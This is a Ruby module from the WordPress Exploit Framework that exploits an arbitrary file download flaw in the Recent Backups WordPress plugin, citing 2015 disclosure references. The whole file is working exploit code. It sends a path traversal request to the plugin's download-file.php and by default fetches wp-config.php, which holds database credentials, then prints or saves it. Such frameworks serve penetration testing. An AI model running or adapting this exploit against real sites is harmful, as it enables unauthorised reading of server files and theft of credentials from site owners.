class Wpxf::Auxiliary::RecentBackupsArbitraryFileDownload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Recent Backups Arbitrary File Download',
      desc: 'This module exploits a vulnerability in all versions of the '\
            'Recent Backups plugin which allows you to download any arbitrary '\
            'file accessible by the user the web server is running as.',
      author: [
        'Larry W. Cashdollar',             # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8122'],
        ['URL', 'http://www.vapid.dhs.org/advisory.php?v=148'],
        ['EDB', '37751']
      ],
      date: 'Aug 02 2015'
    )

    register_options([
      StringOption.new(
        name: 'remote_file',
        desc: 'The relative or absolute path to the remote file to download',
        required: true,
        default: '../../../wp-config.php'
      ),
      StringOption.new(
        name: 'export_path',
        desc: 'The file to save the file to',
        required: false
      )
    ])
  end

  def check
    check_plugin_version_from_readme('recent-backups')
  end

  def remote_file
    normalized_option_value('remote_file')
  end

  def export_path
    normalized_option_value('export_path')
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'recent-backups', 'download-file.php')
  end

  def run
    super
    return false unless check_wordpress_and_online

    res = nil

    if export_path.nil?
      emit_info 'Requesting file...'
      res = execute_get_request(
        url: downloader_url,
        params: { 'file_link' => remote_file }
      )
    else
      emit_info 'Downloading file...'
      res = download_file(
        url: downloader_url,
        method: :get,
        params: { 'file_link' => remote_file },
        local_filename: export_path
      )
    end

    if res.nil? || res.timed_out?
      emit_error 'Request timed out, try increasing the http_client_timeout'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    if export_path.nil?
      emit_success "Result: \n#{res.body}"
    else
      emit_success "Downlaoded file to #{export_path}"
    end

    return true
  end
end
